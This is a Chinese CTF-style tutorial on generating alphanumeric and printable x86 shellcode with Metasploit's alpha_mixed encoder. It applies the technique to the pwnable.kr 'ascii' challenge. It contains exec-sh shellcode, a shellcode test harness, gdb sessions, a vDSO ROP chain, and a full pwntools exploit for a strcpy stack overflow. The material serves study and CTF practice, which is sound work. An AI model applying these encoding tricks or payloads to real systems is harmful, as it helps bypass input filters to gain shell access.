> 原文链接: https://www.anquanke.com//post/id/85871 


# 【技术分享】生成自己的Alphanumeric/Printable shellcode


                                阅读量   
                                **242951**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

![](https://p0.ssl.qhimg.com/t0119a4cca6bdd5cddf.jpg)

作者：[WeaponX](http://bobao.360.cn/member/contribute?uid=2803578480)

预估稿费：400RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**背景**

最近在看一些题目(pwnable.kr-ascii, pwnable.kr-ascii_easy, pwnable.tw-Death_Note)和漏洞(CVE-2017-7269-IIS6.0远程代码执行漏洞)的时候用到Alphanumeric/Printable shellcode。本文不阐述如何书写Alphanumeric/Printable shellcode，而是教大家如何使用Metasploit生成自己的shellcode和在特定条件下寄存器的设置。

所谓Alphanumeric是字符在[A-Za-z0-9]区间的，而Printable是字符的ascii码在0x1f和0x7f区间(不包含)的。

shellcode测试可以用以下代码测试。

```
/*
 * $ gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
 * $ ./shellcode
 */
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char shellcode[] = `{`
  "x89xe0xdbxd6xd9x70xf4x5ax4ax4ax4ax4ax4ax4ax4a"
  "x4ax4ax4ax4ax43x43x43x43x43x43x37x52x59x6ax41"
  "x58x50x30x41x30x41x6bx41x41x51x32x41x42x32x42"
  "x42x30x42x42x41x42x58x50x38x41x42x75x4ax49x50"
  "x6ax66x6bx53x68x4fx69x62x72x73x56x42x48x46x4d"
  "x53x53x4bx39x49x77x51x78x34x6fx44x33x52x48x45"
  "x50x72x48x74x6fx50x62x33x59x72x4ex6cx49x38x63"
  "x70x52x38x68x55x53x67x70x35x50x65x50x74x33x45"
  "x38x35x50x50x57x72x73x6fx79x58x61x5ax6dx6fx70"
  "x41x41"
`}`;
int main()
`{`
    printf("Shellcode Length:  %dn",(int)strlen(shellcode));
    printf("Shellcode is [%s]n", shellcode);
    int (*ret)() = (int(*)())shellcode;
    ret();
    return 0;
`}`
```



**使用metasploit生成Alphanumeric shellcode**

首先查看一下metasploit中有什么编码器，其次查看能实现Alphanumeric的编码器。

```
root@kali ~ msfvenom -l
Framework Encoders
==================
    Name                          Rank       Description
    ----                          ----       -----------
    ...
    x64/xor                       normal     XOR Encoder
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    ...
```

可以使用的Encoders有x86/alpha_mixed与x86/alpha_upper和x86/unicode_mixed与x86/unicode_upper，不过Unicode encoder是针对类似CVE-2017-7269等宽字节进行编码的。因此在本文中我们使用到的编码器为x86/alpha_mixed。

首先，使用msfvenom来生成一段shellcode并进行编码。

```
root@kali ~ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed -f c     
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 137 (iteration=0)
x86/alpha_mixed chosen with final size 137
Payload size: 137 bytes
unsigned char buf[] =
"x89xe0xdbxd6xd9x70xf4x5ax4ax4ax4ax4ax4ax4ax4a"
"x4ax4ax4ax4ax43x43x43x43x43x43x37x52x59x6ax41"
"x58x50x30x41x30x41x6bx41x41x51x32x41x42x32x42"
"x42x30x42x42x41x42x58x50x38x41x42x75x4ax49x50"
"x6ax66x6bx53x68x4fx69x62x72x73x56x42x48x46x4d"
"x53x53x4bx39x49x77x51x78x34x6fx44x33x52x48x45"
"x50x72x48x74x6fx50x62x33x59x72x4ex6cx49x38x63"
"x70x52x38x68x55x53x67x70x35x50x65x50x74x33x45"
"x38x35x50x50x57x72x73x6fx79x58x61x5ax6dx6fx70"
"x41x41";
```

可以发现，前几个字符x89xe0xdbxd6xd9x70xf4并不是Alphanumeric或者Printable，因为此shellcode的前面数条指令是为了让这段shellcode位置无关，完成了获取shellcode地址并放入通用寄存器中的功能。

然而，我们可以根据不同程序栈中的数据来自己完成将shellcode的地址放入指定的寄存器BufferRegister中的Alphanumeric Instructions。例如，当BufferRegister为ECX寄存器时，可以通过如下命令生成Alphanumeric shellcode。

```
⚡ root@kali ⮀ ~ ⮀ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed BufferRegister=ECX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 129 (iteration=0)
x86/alpha_mixed chosen with final size 129
Payload size: 129 bytes
buf =  ""
buf += "x49x49x49x49x49x49x49x49x49x49x49x49x49"
buf += "x49x49x49x49x37x51x5ax6ax41x58x50x30x41"
buf += "x30x41x6bx41x41x51x32x41x42x32x42x42x30"
buf += "x42x42x41x42x58x50x38x41x42x75x4ax49x71"
buf += "x7ax56x6bx32x78x6ax39x71x42x72x46x42x48"
buf += "x64x6dx63x53x6fx79x4ax47x73x58x34x6fx64"
buf += "x33x30x68x33x30x33x58x44x6fx42x42x72x49"
buf += "x30x6ex6fx79x48x63x76x32x38x68x67x73x37"
buf += "x70x67x70x57x70x43x43x63x58x33x30x62x77"
buf += "x76x33x6ex69x4dx31x38x4dx4bx30x41x41"
⚡ root@kali ⮀ ~ ⮀ python
Python 2.7.9 (default, Mar  1 2015, 12:57:24)
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; buf =  ""
&gt;&gt;&gt; buf += "x49x49x49x49x49x49x49x49x49x49x49x49x49"
&gt;&gt;&gt; buf += "x49x49x49x49x37x51x5ax6ax41x58x50x30x41"
&gt;&gt;&gt; buf += "x30x41x6bx41x41x51x32x41x42x32x42x42x30"
&gt;&gt;&gt; buf += "x42x42x41x42x58x50x38x41x42x75x4ax49x71"
&gt;&gt;&gt; buf += "x7ax56x6bx32x78x6ax39x71x42x72x46x42x48"
&gt;&gt;&gt; buf += "x64x6dx63x53x6fx79x4ax47x73x58x34x6fx64"
&gt;&gt;&gt; buf += "x33x30x68x33x30x33x58x44x6fx42x42x72x49"
&gt;&gt;&gt; buf += "x30x6ex6fx79x48x63x76x32x38x68x67x73x37"
&gt;&gt;&gt; buf += "x70x67x70x57x70x43x43x63x58x33x30x62x77"
&gt;&gt;&gt; buf += "x76x33x6ex69x4dx31x38x4dx4bx30x41x41"
&gt;&gt;&gt; buf
'IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIqzVk2xj9qBrFBHdmcSoyJGsX4od30h303XDoBBrI0noyHcv28hgs7pgpWpCCcX30bwv3niM18MK0AA'
```

测试生成的shellcode时会发生段错误。因为执行shellcode时ECX中的值并不是shellcode的地址。

```
gdb-peda$ p $eip
$3 = (void (*)()) 0x804a040 &lt;shellcode&gt;
gdb-peda$ p $ecx
$4 = 0x0
```

此时需手动将ecx的值设置为0x804a040，然后继续执行。

```
gdb-peda$ p $ecx
$4 = 0x0
gdb-peda$ set $ecx=0x804a040
gdb-peda$ c
Continuing.
process 14672 is executing new program: /bin/dash
[New process 14689]
process 14689 is executing new program: /bin/dash
$ ls
[New process 14690]
process 14690 is executing new program: /bin/ls
peda-session-ls.txt  peda-session-shellcode.txt  shellcode  shellcode.c
```



**示例**

题目下载地址：

[https://github.com/Qwaz/solved-hacking-problem/tree/master/pwnable.kr/ascii](https://github.com/Qwaz/solved-hacking-problem/tree/master/pwnable.kr/ascii)

使用ida载入ELF文件查看伪代码。发现程序先分配了一块内存，然后向内存中写长度为499的数据(Printable)，在函数vuln中使用strcpy时未检测源字符串长度发生栈溢出。

```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  _BYTE *ptr; // ebx@6
  char v5; // [sp+4h] [bp-30h]@1
  int base; // [sp+28h] [bp-Ch]@1
  unsigned int offset; // [sp+2Ch] [bp-8h]@4
  base = mmap(0x80000000, 4096, 7, 50, -1, 0);
  if ( base != 0x80000000 )
  `{`
    puts("mmap failed. tell admin");
    exit(1);
  `}`
  printf("Input text : ", v5);
  offset = 0;
  do
  `{`
    if ( offset &gt; 399 )
      break;
    ptr = (_BYTE *)(base + offset);
    *ptr = getchar();
    ++offset;
  `}`
  while ( is_ascii(*ptr) );
  puts("triggering bug...");
  return (int)vuln();
`}`
char *vuln()
`{`
  char dest; // [sp+10h] [bp-A8h]@1
  return strcpy(&amp;dest, (const char *)0x80000000);
`}`
```

思路：

1.生成BufferRegister为EAX的shellcode

2.构造Alphanumeric Instructions设置寄存器EAX为shellcode的地址

3.将Printable shellcode写入mmap的内存中

4.构造ROP Chain跳入0x80000000

5.执行shellcode

<br>

**STEP1**

使用ldd查看程序并未加载动态库可以确定本程序是静态编译的。静态编译的程序通常有大量的ROP Gadgets供我们使用，不过题目要求输入的字符为可打印字符，这就需要Gadgets的地址是Printable的。

```
gdb-peda$ info proc map
process 15655
Mapped address spaces:
Start Addr   End Addr       Size     Offset objfile
 0x8048000  0x80ed000    0xa5000        0x0 /home/user/pwn/pwnkr/ascii/ascii
 0x80ed000  0x80ef000     0x2000    0xa5000 /home/user/pwn/pwnkr/ascii/ascii
 0x80ef000  0x8113000    0x24000        0x0 [heap]
0x55555000 0x55557000     0x2000        0x0 [vvar]
0x55557000 0x55559000     0x2000        0x0 [vdso]
0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

可以看出代码段中的地址0x080e均是不可打印字符，所以不能在代码段中搜索Gadgets。不过可以使用ulimit -s unlimited将vDSO的基址固定来找vDSO中的Gadgets([mmap及linux地址空间随机化失效漏洞](http://weaponx.site/2017/03/13/mmap%E5%8F%8Alinux%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8C%96%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E/))。

使用命令dump binary memory ./vDsodump 0x55557000 0x55559000将vDSO所在的内存空间dump出来，当程序执行到ret观察栈中的数据并寻找可用的数据。

```
gdb-peda$ stack 15
0000| 0xffffd63c --&gt; 0x8048fcb (&lt;main+189&gt;:mov    ebx,DWORD PTR [ebp-0x4])
0004| 0xffffd640 --&gt; 0x80c562e ("triggering bug...")
0008| 0xffffd644 --&gt; 0x1000
0012| 0xffffd648 --&gt; 0x7
0016| 0xffffd64c --&gt; 0x32 ('2')
0020| 0xffffd650 --&gt; 0xffffffff
0024| 0xffffd654 --&gt; 0x0
0028| 0xffffd658 --&gt; 0xffffd704 --&gt; 0xffffd839 ("/home/user/pwn/pwnkr/ascii/ascii")
0032| 0xffffd65c --&gt; 0x1
0036| 0xffffd660 --&gt; 0x80496e0 (&lt;__libc_csu_fini&gt;:push   ebx)
0040| 0xffffd664 --&gt; 0x0
0044| 0xffffd668 --&gt; 0x80000000 --&gt; 0xa31 ('1n')
0048| 0xffffd66c --&gt; 0x2
0052| 0xffffd670 --&gt; 0x0
0056| 0xffffd674 --&gt; 0x0
```

明显看出pop3_ret + pop3_ret + pop2_ret可以让程序跳入0x80000000执行shellcode。然后使用rp++在dump出的vDSO内存空间中搜索ROP Gadgets。在offset中寻找Printable的Gadgets发现有pop3_ret(0x00000751)和pop2_ret(0x00000752)，这样就可以构造出跳入0x80000000的ROP Chain。



**STEP2**

使用metasploit生成BufferRegister为EAX的shellcode，现在需要编写Printable Instructions将EAX设置为shellcode起始的地址。opcode为Alphanumeric的指令如下表所示

![](https://p2.ssl.qhimg.com/t0118d11eaa733af0e9.png)

r(register)代表寄存器，r8代表8位寄存器例如alah等

m(memory)代表内存

imm(immediate value)代表立即数

rel(relative address)代表相对地址

r/m(register or memory)代表内存或寄存器，可参考[ModR/M与SIB编码](http://blog.sina.com.cn/s/blog_67b113a101011fl9.html)

在程序跳入shellcode中(0x80000000)时，各个寄存器的值如下。

```
gdb-peda$ info r
eax            0xffffd5900xffffd590
ecx            0x800000d00x800000d0
edx            0xffffd6600xffffd660
ebx            0x800000d70x800000d7
esp            0xffffd66c0xffffd66c
ebp            0xa6161610xa616161
esi            0x414141410x41414141
edi            0x414141410x41414141
eip            0x800000000x80000000
```

可以使用XOR AL, imm8清除EAX的低7bit，再用过DEC EAX/AX完成EAX的高位退位，多次重复后可以得到需要的地址（本实例仅需重复一次）。

```
# Alphanumeric
push ecx       //Q
pop eax        //X    =&gt; eax = 0x800000d0
xor al,0x50    //4P   =&gt; eax = 0x80000080
push eax       //P
pop ecx        //Y
dec ecx        //I    =&gt; ecx = 0x8000007f
push ecx       //Q
pop eax        //X
xor al,0x74    //4t   =&gt; eax = 0x8000000b =&gt; shellcode begin = 0x80000000 + len(QX4PPYIQX4t)
```

得到的指令序列为QX4PPYIQX4t。但题目中并不要求Alphanumeric而是要求Printable，所以可以使用sub完成寄存器数据的修改。

```
&gt;&gt;&gt; asm("sub eax,0x41")
'x83xe8A'
&gt;&gt;&gt; asm("sub ebx,0x41")
'x83xebA'
&gt;&gt;&gt; asm("sub ecx,0x41")
'x83xe9A'
&gt;&gt;&gt; asm("sub edx,0x41")
'x83xeaA'
&gt;&gt;&gt; asm("sub al,0x41")
',A'
&gt;&gt;&gt; asm("sub bl,0x41")
'x80xebA'
&gt;&gt;&gt; asm("sub cl,0x41")
'x80xe9A'
&gt;&gt;&gt; asm("sub dl,0x41")
'x80xeaA'
```

能大段修改的寄存器只有EAX且范围为0x20-0x7e，可以分两步修改。最终使用的Shellcode头部为

```
# Printable
push ebx       //S
pop  eax       //X    =&gt; 0x800000d7
sub  al, 0x7e  //,~   =&gt; 0x80000059
sub  al, 0x53  //,S   =&gt; 0x80000006 =&gt; shellcode begin = 0x80000000 + len(SX,~,S)
```

和shellcode拼接起来就获得了最终的exploit

```
from pwn import *
pop3_ret = 0x00000751 # : pop ebx ; pop esi ; pop ebp ; ret  ;  (1 found)
pop2_ret = 0x00000752 # : pop esi ; pop ebp ; ret  ;  (1 found)
# 0x1f &lt; c &lt; 0x7f
vdso_base = 0x55557000
offset = 172
#payload  = "SX,~,S" # push ebx;pop eax;sub al,0x7e;sub al,0x53
payload  = "QX4PPYIQX4t"
payload += "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0"
payload += "A00ABAABTAAQ2AB2BB0BBXP8ACJJIS"
payload += "ZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS"
payload += "0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE"
payload += "22I2NFOSCRHEP0WQCK9KQ8MK0AA"
payload  = payload.ljust(offset, "x41")
# ROP CHAIN
payload += p32(vdso_base + pop3_ret)
payload += p32(0x41414141)
payload += p32(0x41414141)
payload += p32(0x41414141)
payload += p32(vdso_base + pop3_ret)
payload += p32(0x41414141)
payload += p32(0x41414141)
payload += p32(0x41414141)
payload += p32(vdso_base + pop2_ret)
payload += p32(0x41414141)
payload += "aaa"
io = process("./ascii")
io.sendline(payload)
io.interactive()
```

<br>

**Refer**

[https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)

[http://note.heron.me/2014/11/alphanumeric-shellcode-of-execbinsh.html](http://note.heron.me/2014/11/alphanumeric-shellcode-of-execbinsh.html)

[https://nets.ec/Alphanumeric_shellcode](https://nets.ec/Alphanumeric_shellcode)

[https://nets.ec/Ascii_shellcode](https://nets.ec/Ascii_shellcode)

[http://www.vividmachines.com/shellcode/shellcode.html#ps](http://www.vividmachines.com/shellcode/shellcode.html#ps)

[http://inaz2.hatenablog.com/entry/2014/07/11/004655](http://inaz2.hatenablog.com/entry/2014/07/11/004655)

[http://inaz2.hatenablog.com/entry/2014/07/12/000007](http://inaz2.hatenablog.com/entry/2014/07/12/000007)

[http://inaz2.hatenablog.com/entry/2014/07/13/025626](http://inaz2.hatenablog.com/entry/2014/07/13/025626)

[http://blog.sina.com.cn/s/blog_67b113a101011fl9.html](http://blog.sina.com.cn/s/blog_67b113a101011fl9.html)

[http://www.c-jump.com/CIS77/CPU/x86/X77_0080_mod_reg_r_m_byte_reg.htm](http://www.c-jump.com/CIS77/CPU/x86/X77_0080_mod_reg_r_m_byte_reg.htm)
